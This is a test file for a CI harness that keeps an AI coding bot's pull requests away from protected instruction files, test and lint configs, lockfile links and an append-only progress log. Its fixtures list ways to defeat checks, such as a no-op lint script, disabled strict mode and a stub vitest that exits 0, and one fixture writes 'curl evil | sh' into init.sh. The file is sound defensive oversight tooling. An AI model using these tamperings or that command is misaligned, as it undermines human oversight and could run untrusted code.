import { strict as assert } from 'node:assert';
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { describe, it } from 'node:test';
import {
  computeLock, directoryReader, lockfileProblems, lockMismatches, matches, npmScripts, planKindOf, prKind, protectedChanges, protectionRules, verify,
} from '../src/ci/harness-ci.ts';
import { run, runOk } from '../src/util.ts';
import { tempDir } from './helpers/toy-repo.ts';

const script = join(import.meta.dirname, '..', 'src', 'ci', 'harness-ci.ts');
const BOT = 'acme-harness[bot]';

function write(root: string, files: Record<string, string>): void {
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), content);
  }
}

const BASE: Record<string, string> = {
  'harness/config.json': JSON.stringify({
    harnessVersion: '0.1.0',
    project: { name: 'shop', repo: 'acme/shop', bot: BOT },
    checks: [{ id: 'lint', run: 'npm run lint', phase: 'pre-merge' }],
    protect: { files: ['eslint.rules.js'] },
  }),
  'harness/modules/shop/plans/P1.json': JSON.stringify({
    id: 'P1', module: 'shop', title: 'T', goal: 'G',
    features: [{ id: 'F01', title: 'A', description: 'd', expected: 'e', checks: [{ id: 'F01-test', run: 'npm test', phase: 'pre-merge' }] }],
  }),
  'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'eslint .', test: 'node --test', build: 'tsc' } }, null, 2),
  'tsconfig.json': '{\n  // strict is protected\n  "compilerOptions": { "strict": true, "target": "es2024", },\n}\n',
  'progress.txt': '2026-01-01T00:00:00Z feature.accepted shop/P0/F00 attempt=1 "old"\n',
  'src/app.js': 'export const x = 1;\n',
};

/** The base's files with `harness/config.json` extended, such as with a `terraform` section. */
function withConfig(extra: Record<string, unknown>): Record<string, string> {
  return { ...BASE, 'harness/config.json': JSON.stringify({ ...(JSON.parse(BASE['harness/config.json']!) as object), ...extra }) };
}

/** A repository with main, and a branch with `changes` on top; returns trees and the changed paths. */
async function change(changes: Record<string, string>, files: Record<string, string> = BASE) {
  const dir = tempDir('ci');
  write(dir, files);
  const git = (...args: string[]) => runOk('git', ['-C', dir, '-c', 'user.name=t', '-c', 'user.email=t@test.invalid', ...args]);
  await runOk('git', ['init', '--quiet', '--initial-branch=main', dir]);
  await git('add', '-A');
  await git('commit', '--quiet', '-m', 'base');
  const base = (await git('rev-parse', 'HEAD')).trim();
  await git('checkout', '--quiet', '-b', 'plan/shop/P1');
  write(dir, changes);
  await git('add', '-A');
  await git('commit', '--quiet', '--allow-empty', '-m', 'change');
  const head = (await git('rev-parse', 'HEAD')).trim();
  const baseDir = tempDir('base');
  await runOk('git', ['clone', '--quiet', dir, baseDir]);
  await runOk('git', ['-C', baseDir, 'checkout', '--quiet', base]);
  const changed = (await git('diff', '-z', '--name-only', `${base}...${head}`)).split('\0').filter(Boolean);
  return { dir, baseDir, base, head, changed, baseTree: directoryReader(baseDir), headTree: directoryReader(dir) };
}

describe('protection rules', () => {
  it('finds the npm scripts a check runs', () => {
    assert.deepEqual(npmScripts('npm run lint && npm test -- --watch=false; npm t; npm start'), ['lint', 'test', 'test', 'start']);
    assert.deepEqual(npmScripts('node --test'), []);
    // npm's options are skipped, before the command and after `run`, with the value of those that take one.
    assert.deepEqual(npmScripts('npm run -s lint'), ['lint']);
    assert.deepEqual(npmScripts('npm -s test'), ['test']);
    assert.deepEqual(npmScripts('npm --prefix . test && npm -w app --if-present run-script build:prod'), ['test', 'build:prod']);
    assert.deepEqual(npmScripts('CI=1 npm --loglevel=silent restart; (npm stop)'), ['restart', 'stop']);
    assert.deepEqual(npmScripts('node --run lint && node --run=typecheck'), ['lint', 'typecheck']);
    assert.deepEqual(npmScripts('npm ci && npx vitest --run'), []);
  });

  it("pin the scripts the checks run, with npm's hooks around them", async () => {
    const { baseTree } = await change({});
    const rules = await protectionRules(baseTree);
    assert.deepEqual(rules.fields['package.json'], [
      '/jest', '/babel', '/mocha', '/scripts/lint', '/scripts/prelint', '/scripts/postlint', '/scripts/test', '/scripts/pretest', '/scripts/posttest',
    ]);
    assert.ok(rules.paths.includes('eslint.rules.js'));
    assert.ok(rules.paths.includes('harness/**'));
  });

  it('match patterns segment by segment: * and ? within one, ** across any number', () => {
    const yes: Array<[string, string]> = [
      ['CLAUDE.md', '**/CLAUDE.md'], ['a/b/CLAUDE.md', '**/CLAUDE.md'], ['src/.claude/rules/x.md', '**/.claude/**'], ['src/.claude', '**/.claude/**'],
      ['harness/a\nb', 'harness/**'], ['a/b', 'a/**/b'], ['a/x/y/b', 'a/**/b'], ['src/a.ts', 'src/*.ts'], ['docs/a.md', 'docs/?.md'],
      ['x.ts', './x.ts'], ['config/a/b.yml', 'config/'], ['config/a/b.yml', 'config///'], ['a+b (1).txt', 'a+b (1).txt'],
    ];
    const no: Array<[string, string]> = [
      ['a/xCLAUDE.md', '**/CLAUDE.md'], ['CLAUDE.md.bak', '**/CLAUDE.md'], ['harnessx/a', 'harness/**'], ['src/a/b.ts', 'src/*.ts'],
      ['docs/ab.md', 'docs/?.md'], ['configs/a.yml', 'config/'], ['aab (1).txt', 'a+b (1).txt'],
    ];
    for (const [path, pattern] of yes) assert.ok(matches(path, pattern), `${path} matches ${pattern}`);
    for (const [path, pattern] of no) assert.ok(!matches(path, pattern), `${path} doesn't match ${pattern}`);
  });

  it('read protect.files in linear time, even a pattern with a long run of slashes before its end', async () => {
    const files: Record<string, string> = { 'harness/config.json': JSON.stringify({ protect: { files: [`a${'/'.repeat(100_000)}b`, 'config///'] } }) };
    const tree = { read: async (path: string) => files[path], list: async () => Object.keys(files) };
    const started = performance.now();
    const rules = await protectionRules(tree);
    assert.ok(performance.now() - started < 1000);
    assert.ok(rules.paths.includes('config/**'));
  });

  it('protect the instructions Claude Code reads in any folder, and the configs that decide what a check runs', async () => {
    const pr = await change({
      'CLAUDE.local.md': '-', 'src/CLAUDE.md': '-', 'src/CLAUDE.local.md': '-', 'src/AGENTS.md': '-', 'src/.claude/rules/x.md': '-',
      'vitest.config.mts': '-', 'vite.config.ts': '-', 'jest.config.cjs': '-', 'jest.config.json': '{}', 'babel.config.js': '-', 'src/.babelrc': '{}',
      '.mocharc.yml': '-', 'playwright.config.mts': '-', 'pytest.ini': '-', 'tests/unit/pytest.ini': '-', 'tox.ini': '-', 'tests/conftest.py': '-',
      'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'eslint .', test: 'node --test', build: 'tsc' }, jest: { testMatch: [] } }, null, 2),
      // Not instructions, nor the root's configs.
      'src/claude.md': '-', 'docs/CLAUDE.md.bak': '-', 'packages/a/vitest.config.ts': '-',
    });
    const problems = await protectedChanges(pr.baseTree, pr.headTree, pr.changed, { progress: 'append' });
    assert.deepEqual(problems.sort(), [
      '.mocharc.yml', 'CLAUDE.local.md', 'babel.config.js', 'jest.config.cjs', 'jest.config.json', 'package.json /jest', 'playwright.config.mts', 'pytest.ini',
      'src/.babelrc', 'src/.claude/rules/x.md', 'src/AGENTS.md', 'src/CLAUDE.local.md', 'src/CLAUDE.md', 'tests/conftest.py', 'tests/unit/pytest.ini', 'tox.ini',
      'vite.config.ts', 'vitest.config.mts',
    ]);
  });

  it('read protect.files as globs, with ./ and a trailing slash as written', async () => {
    const config = withConfig({ protect: { files: ['./secret.ts', 'config/', 'db/**/*.sql', '**/fixtures/*.json', 'docs/?.md'] } });
    const pr = await change({
      'secret.ts': '-', 'config/a/b.yml': '-', 'db/schema.sql': '-', 'db/m/001.sql': '-', 'test/fixtures/a.json': '-', 'fixtures/b.json': '-', 'docs/a.md': '-',
      'db/m/001.txt': '-', 'test/fixtures/deep/c.json': '-', 'docs/ab.md': '-', 'src/secret.ts': '-',
    }, config);
    assert.deepEqual((await protectedChanges(pr.baseTree, pr.headTree, pr.changed, { progress: 'append' })).sort(), [
      'config/a/b.yml', 'db/m/001.sql', 'db/schema.sql', 'docs/a.md', 'fixtures/b.json', 'secret.ts', 'test/fixtures/a.json',
    ]);
  });

  it('flag protected files and fields, and let the rest change', async () => {
    const touched = await change({
      'src/app.js': 'export const x = 2;\n',
      'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'true', test: 'node --test', build: 'tsc -b', prelint: 'true' } }, null, 2),
      'tsconfig.json': '{ "compilerOptions": { "strict": false, "target": "es2022" } }\n',
      'harness/modules/shop/checks/x.sh': 'true\n',
      'eslint.rules.js': 'export default [];\n',
    });
    const problems = await protectedChanges(touched.baseTree, touched.headTree, touched.changed, { progress: 'append' });
    assert.deepEqual(problems.sort(), [
      'eslint.rules.js', 'harness/modules/shop/checks/x.sh', 'package.json /scripts/lint', 'package.json /scripts/prelint', 'tsconfig.json /compilerOptions/strict',
    ]);

    const fine = await change({ 'src/app.js': 'export const x = 3;\n', 'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'eslint .', test: 'node --test', build: 'tsc -b' } }) });
    assert.deepEqual(await protectedChanges(fine.baseTree, fine.headTree, fine.changed, { progress: 'append' }), []);
  });

  it('let progress.txt grow in a PR, never be rewritten, and stay out of an agent\'s reach', async () => {
    const grown = await change({ 'progress.txt': `${BASE['progress.txt']}2026-01-02T00:00:00Z feature.accepted shop/P1/F01 attempt=1 "new"\n` });
    assert.deepEqual(await protectedChanges(grown.baseTree, grown.headTree, grown.changed, { progress: 'append' }), []);
    assert.deepEqual(await protectedChanges(grown.baseTree, grown.headTree, grown.changed, { progress: 'frozen' }), ['progress.txt']);
    const rewritten = await change({ 'progress.txt': 'nothing happened\n' });
    assert.deepEqual(await protectedChanges(rewritten.baseTree, rewritten.headTree, rewritten.changed, { progress: 'append' }), ['progress.txt (only lines may be added)']);
  });

  it('accept only the public npm registry in package-lock.json, and the links the base already has', async () => {
    const lock = (packages: Record<string, object>) => JSON.stringify({ packages: { '': { name: 'shop' }, ...packages } });
    const workspace = { 'node_modules/c': { resolved: 'packages/c', link: true }, 'packages/c': { name: 'c', version: '1.0.0' } };
    const base = { ...BASE, 'package-lock.json': lock(workspace) };
    const pr = await change({
      'package-lock.json': lock({
        ...workspace,
        'node_modules/a': { resolved: 'https://registry.npmjs.org/a/-/a-1.0.0.tgz' },
        'node_modules/b': { resolved: 'git+ssh://git@example.com/b.git#abc' },
        // A stub that exits 0, where the checks expect vitest.
        'node_modules/vitest': { resolved: 'tools/vitest', link: true },
        'tools/vitest': { name: 'vitest', version: '4.0.0' },
      }),
    }, base);
    assert.deepEqual(await lockfileProblems(pr.baseTree, pr.headTree), [
      'node_modules/b resolves from git+ssh://git@example.com/b.git#abc', "node_modules/vitest links to tools/vitest, which the base branch doesn't",
    ]);
    const moved = await change({ 'package-lock.json': lock({ ...workspace, 'node_modules/c': { resolved: 'tools/c', link: true } }) }, base);
    assert.deepEqual(await lockfileProblems(moved.baseTree, moved.headTree), ["node_modules/c links to tools/c, which the base branch doesn't"]);
    const plan = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1', title: 'Plan: shop/P1 — T' };
    assert.ok((await verify(plan)).includes("package-lock.json: node_modules/vitest links to tools/vitest, which the base branch doesn't"));
  });

  it('write a hash list that matches its tree until something protected changes', async () => {
    const { dir, baseTree } = await change({});
    const lock = await computeLock(baseTree);
    assert.ok(lock.entries.some((e) => e.path === 'harness/config.json' && 'sha256' in e));
    assert.ok(lock.entries.some((e) => e.path === 'CLAUDE.md' && 'sha256' in e && e.sha256 === 'absent'));
    write(dir, { 'harness/lock.json': JSON.stringify(lock) });
    assert.deepEqual(await lockMismatches(directoryReader(dir)), []);
    write(dir, { 'tsconfig.json': '{ "compilerOptions": { "strict": false } }' });
    assert.deepEqual(await lockMismatches(directoryReader(dir)), [
      'tsconfig.json: not as listed', 'tsconfig.json: listed, but different or gone',
    ]);
  });

  it("hash what git sees, never what it ignores, so the owner's tree and CI's checkout agree", async () => {
    const dir = tempDir('lock');
    write(dir, { ...BASE, '.gitignore': 'node_modules/\n*.log\n', 'src/CLAUDE.md': '# src\n' });
    const git = (...args: string[]) => runOk('git', ['-C', dir, '-c', 'user.name=t', '-c', 'user.email=t@test.invalid', ...args]);
    await runOk('git', ['init', '--quiet', '--initial-branch=main', dir]);
    await git('add', '-A');
    await git('commit', '--quiet', '-m', 'base');
    // Installed packages and a log, which git ignores, and an instruction file not committed yet.
    write(dir, { 'node_modules/pkg/CLAUDE.md': '-', 'node_modules/pkg/conftest.py': '-', 'harness/debug.log': '-', 'lib/AGENTS.md': '# lib\n' });
    const lock = await computeLock(directoryReader(dir));
    const paths = lock.entries.map((e) => e.path);
    assert.ok(paths.includes('src/CLAUDE.md') && paths.includes('lib/AGENTS.md'), paths.join(' '));
    assert.ok(!paths.some((p) => p.startsWith('node_modules/') || p.endsWith('.log')), paths.join(' '));
    write(dir, { 'harness/lock.json': JSON.stringify(lock) });
    await git('add', '-A');
    await git('commit', '--quiet', '-m', 'lock');
    const checkout = tempDir('checkout');
    await runOk('git', ['clone', '--quiet', dir, checkout]);
    assert.deepEqual(await lockMismatches(directoryReader(checkout)), []);
  });

  it('hash the same whatever the machine\'s locale', async () => {
    const dir = tempDir('locale');
    write(dir, {
      'harness/config.json': JSON.stringify({ harnessVersion: '0.1.0', project: { name: 'x' }, protect: { jsonFields: { 'h.json': ['/v'], 'ch.json': ['/v'] } } }),
      'h.json': JSON.stringify({ v: { h: 1, ch: 2, i: 3 } }),
      'ch.json': JSON.stringify({ v: { i: 1, ch: 2, h: 3 } }),
    });
    // Czech sorts "ch" after "h".
    const lock = (locale: string) => runOk('node', [script, 'lock', '--dir', dir], { env: { ...process.env, LANG: locale, LC_ALL: locale } });
    assert.equal(await lock('cs_CZ.UTF-8'), await lock('en_US.UTF-8'));
  });
});

describe('verify', () => {
  it("tells a PR's kind by its author and branch, never by its title", () => {
    assert.equal(prKind(BOT, 'plan/shop/P1', BOT), 'Plan');
    assert.equal(prKind(BOT, 'fix/shop/P1-2', BOT), 'Fix');
    assert.equal(prKind('owner', 'plan/shop/P1', BOT), 'Owner');
    assert.equal(prKind('owner', 'harness/upgrade-0.2.0', BOT), 'Harness');
    assert.equal(prKind(BOT, 'feature/x', BOT), 'Owner');
  });

  it('fails a Plan PR that changes a protected file, or carries the wrong title', async () => {
    const pr = await change({ 'harness/modules/shop/plans/P1.json': '{}', 'src/app.js': 'export const x = 9;\n' });
    const input = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1' };
    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 — T' }), ['changes a protected file: harness/modules/shop/plans/P1.json']);
    assert.match((await verify({ ...input, title: 'Owner: sneaky' }))[0]!, /this is a Plan PR .* must start with "Plan: "/);
    assert.deepEqual(await verify({ ...input, author: 'owner', title: 'Owner: design change' }), []);
  });

  it("tells a plan's kind by its features, and a title's tag must agree", async () => {
    assert.equal(planKindOf([{ kind: 'app' }, {}]), 'CODE');
    assert.equal(planKindOf([{ kind: 'infra' }, { kind: 'infra' }]), 'INFRA');
    assert.equal(planKindOf([{ kind: 'app' }, { kind: 'infra' }]), 'MIXED');

    // P1 on the base has one feature without a kind: a CODE plan.
    const pr = await change({ 'src/app.js': 'export const x = 2;\n' });
    const input = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1' };
    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 -CODE- T' }), []);
    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 — T' }), [], 'a title without a tag, from an older daemon, passes');
    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 -INFRA- T' }), [
      "the title says -INFRA-, but shop/P1 is a CODE plan on the base branch: its features' kinds decide",
    ]);
    assert.match((await verify({ ...input, branch: 'plan/shop/P9', title: 'Plan: shop/P9 -CODE- T' }))[0]!, /plans\/P9\.json is missing or unreadable on the base branch/);
  });

  it('keeps a CODE plan off the Terraform folder, and lets an INFRA plan change it', async () => {
    const terraform = { terraform: { dir: 'iac' } };
    const code = await change({ 'iac/queue.tf': 'resource "aws_sqs_queue" "q" {}\n', 'src/app.js': 'export const x = 3;\n' }, withConfig(terraform));
    const input = { author: BOT, branch: 'plan/shop/P1', title: 'Plan: shop/P1 -CODE- T' };
    assert.deepEqual(await verify({ ...input, base: code.baseTree, head: code.headTree, changedPaths: code.changed }), [
      'a CODE plan may not change iac/: infrastructure gets plans of its own (v3 §3.1); changed: iac/queue.tf',
    ]);

    const noTerraform = await change({ 'iac/queue.tf': 'resource "aws_sqs_queue" "q" {}\n' });
    assert.deepEqual(await verify({ ...input, base: noTerraform.baseTree, head: noTerraform.headTree, changedPaths: noTerraform.changed }), [], 'without a terraform section, nothing is checked');

    const infraPlan = JSON.stringify({
      id: 'P1', module: 'shop', title: 'T', goal: 'G',
      features: [{ id: 'F01', title: 'A', kind: 'infra', description: 'd', expected: 'e', checks: [{ id: 'F01-plan', run: 'node check.mjs', phase: 'pre-merge', needs: ['tfplan'] }] }],
    });
    const infra = await change({ 'iac/queue.tf': 'resource "aws_sqs_queue" "q" {}\n' }, { ...withConfig(terraform), 'harness/modules/shop/plans/P1.json': infraPlan });
    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 -INFRA- T', base: infra.baseTree, head: infra.headTree, changedPaths: infra.changed }), []);

    // The folder as the owner may write it.
    for (const dir of ['./iac', 'iac/']) {
      const written = await change({ 'iac/queue.tf': 'resource "aws_sqs_queue" "q" {}\n' }, withConfig({ terraform: { dir } }));
      assert.deepEqual(await verify({ ...input, base: written.baseTree, head: written.headTree, changedPaths: written.changed }), [
        'a CODE plan may not change iac/: infrastructure gets plans of its own (v3 §3.1); changed: iac/queue.tf',
      ], dir);
    }
    // Terraform at the root: every .tf and .tf.json file is infrastructure.
    for (const dir of ['.', '']) {
      const root = await change({ 'modules/q/main.tf': 'resource "aws_sqs_queue" "q" {}\n', 'stack.tf.json': '{}', 'src/app.js': 'export const x = 3;\n' }, withConfig({ terraform: { dir } }));
      assert.deepEqual(await verify({ ...input, base: root.baseTree, head: root.headTree, changedPaths: root.changed }), [
        'a CODE plan may not change Terraform files: infrastructure gets plans of its own (v3 §3.1); changed: modules/q/main.tf, stack.tf.json',
      ], dir);
    }
  });

  it('lets an Arch PR change the design with a matching hash list, and nothing else', async () => {
    const design = { 'harness/modules/shop/plans/P2.json': JSON.stringify({ id: 'P2', module: 'shop', title: 'T', goal: 'G', features: [] }), 'ARCHITECTURE.md': '# Decisions\n' };
    const draft = await change(design);
    const lock = await computeLock(draft.headTree);
    const arch = await change({ ...design, 'harness/lock.json': JSON.stringify(lock) });
    const input = { base: arch.baseTree, head: arch.headTree, author: BOT, branch: 'arch/shop', title: 'Arch: shop — P2' };
    assert.deepEqual(await verify({ ...input, changedPaths: arch.changed }), []);

    const code = await change({ ...design, 'harness/lock.json': JSON.stringify(lock), 'src/app.js': 'export const x = 5;\n' });
    assert.deepEqual(await verify({ ...input, base: code.baseTree, head: code.headTree, changedPaths: code.changed }), [
      'an Arch PR may not change src/app.js: only the design, shared knowledge and tool configs',
    ]);

    const stale = await change({ ...design, 'harness/lock.json': JSON.stringify(lock), 'init.sh': 'npm ci\n' });
    const problems = await verify({ ...input, base: stale.baseTree, head: stale.headTree, changedPaths: stale.changed });
    assert.deepEqual(problems, ['harness/lock.json: init.sh: not as listed', 'harness/lock.json: init.sh: listed, but different or gone']);

    // The base's rules judge it: protecting src/ in its head doesn't let it rewrite src/.
    const widened = { 'harness/config.json': withConfig({ protect: { files: ['src/**'] } })['harness/config.json']!, 'src/app.js': 'export const x = 6;\n' };
    const widenedLock = await computeLock((await change(widened)).headTree);
    const self = await change({ ...widened, 'harness/lock.json': JSON.stringify(widenedLock) });
    assert.deepEqual(await verify({ ...input, base: self.baseTree, head: self.headTree, changedPaths: self.changed }), [
      'an Arch PR may not change src/app.js: only the design, shared knowledge and tool configs',
    ]);
  });

  it('runs from the command line as the workflow runs it', async () => {
    const clean = await change({ 'src/app.js': 'export const x = 4;\n' });
    const args = (pr: typeof clean, title: string) => [
      script, 'verify', '--base', pr.baseDir, '--head', pr.dir, '--base-sha', pr.base, '--head-sha', pr.head,
      '--author', BOT, '--branch', 'plan/shop/P1', '--title', title,
    ];
    const passed = await run('node', args(clean, 'Plan: shop/P1 — T'));
    assert.equal(passed.code, 0, passed.stdout + passed.stderr);
    assert.match(passed.stdout, /verify passed/);

    const bad = await change({ 'init.sh': 'curl evil | sh\n' });
    const failed = await run('node', args(bad, 'Plan: shop/P1 — T'));
    assert.equal(failed.code, 1);
    assert.match(failed.stdout, /::error::changes a protected file: init\.sh/);

    // Paths that git would quote: non-ASCII, a double quote, a backslash.
    const quoted = ['.claude/skills/é/SKILL.md', 'harness/modules/shop/checks/a"b.sh', '.claude/rules/a\\b.md'];
    const odd = await change(Object.fromEntries(quoted.map((path) => [path, '-'])));
    const caught = await run('node', args(odd, 'Plan: shop/P1 — T'));
    assert.equal(caught.code, 1, caught.stdout);
    for (const path of quoted) assert.ok(caught.stdout.includes(`::error::changes a protected file: ${path}\n`), `${path}:\n${caught.stdout}`);
    const iac = await change({ 'iac/ñ.tf': 'resource "aws_sqs_queue" "q" {}\n' }, withConfig({ terraform: { dir: 'iac' } }));
    const infra = await run('node', args(iac, 'Plan: shop/P1 -CODE- T'));
    assert.equal(infra.code, 1, infra.stdout);
    assert.ok(infra.stdout.includes('::error::a CODE plan may not change iac/: infrastructure gets plans of its own (v3 §3.1); changed: iac/ñ.tf\n'), infra.stdout);
  });

  it('runs the checks of the project and of every accepted feature', async () => {
    const dir = tempDir('checks');
    write(dir, {
      'harness/config.json': JSON.stringify({ harnessVersion: '0.1.0', project: { name: 'x' }, checks: [{ id: 'unit', run: 'test -f src/app.js', phase: 'pre-merge' }] }),
      'harness/modules/m/plans/P1.json': JSON.stringify({
        id: 'P1', module: 'm', title: 'T', goal: 'G',
        features: [
          { id: 'F01', title: 'A', description: 'd', expected: 'e', checks: [{ id: 'F01-ok', run: 'true', phase: 'pre-merge' }] },
          { id: 'F02', title: 'B', description: 'd', expected: 'e', checks: [{ id: 'F02-fails', run: 'false', phase: 'pre-merge' }] },
          { id: 'F03', title: 'C', description: 'd', expected: 'e', checks: [{ id: 'F03-later', run: 'false', phase: 'post-deploy' }] },
        ],
      }),
      'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n',
      'src/app.js': '',
    });
    const passed = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(passed.code, 0, passed.stdout);
    assert.match(passed.stdout, /passed: unit\n[\s\S]*passed: F01-ok/);
    assert.doesNotMatch(passed.stdout, /F02/);

    write(dir, { 'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n2026-01-02T00:00:00Z feature.accepted m/P1/F02 attempt=1 "b"\n' });
    const failed = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(failed.code, 1);
    assert.match(failed.stdout, /FAILED \(exit 1\): F02-fails/);
  });

  it('leaves checks that need AWS to the harness, and runs plan assertions only with a plan', async () => {
    const dir = tempDir('checks');
    write(dir, {
      'harness/config.json': JSON.stringify({ harnessVersion: '0.1.0', project: { name: 'x' } }),
      'harness/modules/m/plans/P1.json': JSON.stringify({
        id: 'P1', module: 'm', title: 'T', goal: 'G',
        features: [{
          id: 'F01', title: 'A', description: 'd', expected: 'e', kind: 'infra',
          checks: [
            { id: 'F01-plan', run: 'grep -q aws_s3_bucket "$HARNESS_PLAN_JSON"', phase: 'pre-merge', needs: ['tfplan'] },
            { id: 'F01-view', run: 'aws s3api list-buckets', phase: 'pre-merge', needs: ['aws'] },
          ],
        }],
      }),
      'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n',
      'plan.json': '{"resource_changes":[{"type":"aws_s3_bucket"}]}',
    });
    const without = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(without.code, 0, without.stdout);
    assert.match(without.stdout, /F01-plan asserts on a Terraform plan, and this run made none; skipped/);
    assert.match(without.stdout, /F01-view needs the view-only AWS role, which CI doesn't have/);
    const withPlan = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir], { env: { ...process.env, HARNESS_PLAN_JSON: join(dir, 'plan.json') } });
    assert.equal(withPlan.code, 0, withPlan.stdout);
    assert.match(withPlan.stdout, /passed: F01-plan/);
  });
});
